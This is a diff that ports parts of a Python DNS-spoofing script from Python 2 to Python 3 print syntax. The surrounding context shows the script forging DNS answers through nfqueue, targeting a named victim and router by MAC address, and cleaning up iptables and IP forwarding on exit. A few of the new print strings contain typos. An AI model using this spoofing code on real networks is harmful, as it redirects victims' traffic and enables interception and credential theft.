@@ -56,7 +56,7 @@ def spoofed_pkt(payload, pkt, rIP):
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
     payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
-    print '[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1]
+    print('[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1])
 
 class Queued(object):
     def __init__(self):
@@ -66,7 +66,7 @@ class Queued(object):
         self.q.set_queue_maxlen(5000)
         reactor.addReader(self)
         self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-        print '[*] Waiting for data'
+        print('[*] Waiting for data')
     def fileno(self):
         return self.q.get_fd()
     def doRead(self):
@@ -96,8 +96,8 @@ def main(args):
         sys.exit("Could not find router MAC address. Closing....")
     if victimMAC == None:
         sys.exit("Could not find victim MAC address. Closing....")
-    print '[*] Router MAC:',routerMAC
-    print '[*] Victim MAC:',victimMAC
+    print('[*] Router MAC:',routerMAC)
+    print('*] Victim MAC:',victimMAC)
 
     Queued()
     rctr = threading.Thread(target=reactor.run, args=(False,))
@@ -105,7 +105,7 @@ def main(args):
     rctr.start()
 
     def signal_handler(signal, frame):
-        print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+        print('earing iptables, sending healing packets, and turning off IP forwarding...')
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
             forward.write(ipf_read)
         restore(args.routerIP, args.victimIP, routerMAC, victimMAC)
